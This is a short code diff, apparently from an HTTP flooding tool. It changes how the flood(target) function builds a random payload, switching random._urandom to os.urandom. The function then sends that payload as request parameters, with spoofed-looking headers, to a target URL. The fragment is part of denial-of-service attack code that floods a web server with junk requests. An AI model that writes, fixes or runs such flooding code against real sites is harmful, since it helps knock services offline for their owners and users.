@@ -1,5 +1,6 @@
 import requests
 import random
+from os import urandom as urandom
 import modules.dataRandomizer as randomData
 from colorama import Fore
 
@@ -20,7 +21,7 @@ headers = {
 
 
 def flood(target):
-    payload = str(random._urandom(random.randint(10, 150)))
+    payload = str(urandom(random.randint(10, 150)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
